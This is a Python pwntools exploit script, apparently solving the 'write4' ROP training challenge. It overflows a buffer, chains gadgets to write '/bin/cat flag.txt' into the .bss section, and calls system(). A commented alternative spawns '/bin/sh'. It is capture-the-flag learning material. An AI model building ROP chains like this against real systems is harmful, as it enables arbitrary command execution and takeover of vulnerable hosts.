from pwn import *

# extend arr to be divisible by n (extend using ch
def extend(arr, n, ch):
	diff = 4 - (len(arr) % 4)
	arr.extend([ch] * diff)
	return arr

# convert string to integer in little endian in groups of 4 bytes
def string2int(st):
	def change(ch): return hex(ord(ch))[2:]
	arr = list(map(change, list(st)))
	arr = extend(arr, 8, '00')

	res = []
	for i in range(0, len(arr), 8):
		res.append(arr[i:i+8])

	for i in range(len(res)):
		each = res[i]
		each.reverse()
		fin = ''.join(each)
		res[i] = int(fin, 16)
	
	return res

e = ELF('./write4')
p = e.process()

print(p.recv().decode())

raw_input('attach gdb')

# padding for buffer overflow
padding = b'A' * 40

# address to write arbitrary string (stack)
# writing to .bss section of ELF
base = 0x6010a0

# string to write
st = "/bin/cat flag.txt"

# solution 2 -> spawn shell using system('/bin/sh')
# st = "/bin/sh"

# st in hex
hexs = string2int(st)

# `pop r14 ; pop r15 ; ret` gadget
pop = p64(0x400890)

# `mov qword ptr [r14], r15 ; ret` gadget
mov = p64(0x400820)

# `pop rdi; ret;` gadget
argaddr = p64(0x400893)

# address of call to system
syst = p64(0x400810)

# payload is initialised with padding
payload = padding

mem = base
for n in hexs:
	payload += pop
	payload += p64(mem)
	payload += p64(n)
	payload += mov

	# increment mem to next address
	mem += 8

# address where string is written is provided as argument to system call
payload += argaddr
payload += p64(base)
payload += syst

p.sendline(payload)

flag = p.recv().decode()
success(flag)

# solution 2
# p.interactive()